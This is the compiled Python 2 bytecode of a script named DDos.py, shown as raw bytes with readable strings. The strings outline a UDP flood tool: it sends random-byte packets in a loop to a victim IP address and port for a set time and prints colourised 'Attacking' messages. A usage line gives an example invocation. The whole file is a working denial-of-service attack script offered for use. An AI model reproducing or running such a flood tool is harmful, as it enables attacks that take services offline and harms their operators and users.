ó
}´]c           @   sq   d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d   Z d   Z d   Z e d k rm e   n  d S(   iÿÿÿÿNc           C   s	   d GHd  S(   Ns1   

[1;32m
   python2 ddos.py 127.0.0.1 80 40000

(    (    (    (    s   DDos.pyt   usage   s    c         C   s   t  j  t  j t  j  } t j d  } t j   | } d } xL t j   | k rV Pn  | j | |  | f  | d } d | |  | f GHq@ Wd  S(   Ni   i i   sI   [1;32mAttacking[1;31m %s sent packages[1;32m %s at the port[1;35m %s (   t   sockett   AF_INETt
   SOCK_DGRAMt   randomt   _urandomt   timet   sendto(   t   victimt   vportt   durationt   clientt   bytest   timeoutt   sent(    (    s   DDos.pyt   flood   s    
c           C   sT   t  t j  d k r t   n1 t t j d t t j d  t t j d   d  S(   Ni   i   i   i   (   t   lent   syst   argvR    R   t   int(    (    (    s   DDos.pyt   main   s    
t   __main__(	   R   R   R   R   t   osR    R   R   t   __name__(    (    (    s   DDos.pyt   <module>   s   			